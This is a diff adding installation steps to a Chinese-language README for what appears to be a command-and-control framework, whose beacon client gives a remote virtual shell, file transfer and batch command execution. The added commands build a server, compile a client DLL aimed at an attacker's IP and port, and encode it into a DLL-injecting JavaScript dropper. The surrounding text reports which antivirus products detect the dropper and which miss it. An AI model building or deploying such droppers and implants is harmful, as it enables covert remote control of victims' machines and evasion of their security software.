@@ -12,6 +12,26 @@ beacon端特点：
 2、虚拟shell，查看、上传、下载文件  
 3、提供Python API和命令行接口可批量执行命令和脚本
 
+安装：
+```
+#创建服务端
+#使用Ubuntu18.04
+#root用户登录
+apt install build-essential swig libssl-dev python python-dev python-setuptools python-pip
+pip install m2crypto pycrypto redis cherrypy
+apt install redis-server
+systemctl status redis-server
+systemctl enable redis-server
+./server.py --keys
+./server.py
+```
+```
+#创建客户端
+pip install pefile
+./client_builder.py client.dll [server_IP] [server_PORT]
+./client_encoder.py dll_inject_script client.dll > dropper.js
+```
+
 经过测试发现：  
 1、dropper可以静态免杀  
 2、但在执行时会被Defender、360查杀（火绒、腾讯没有查杀），如下图  
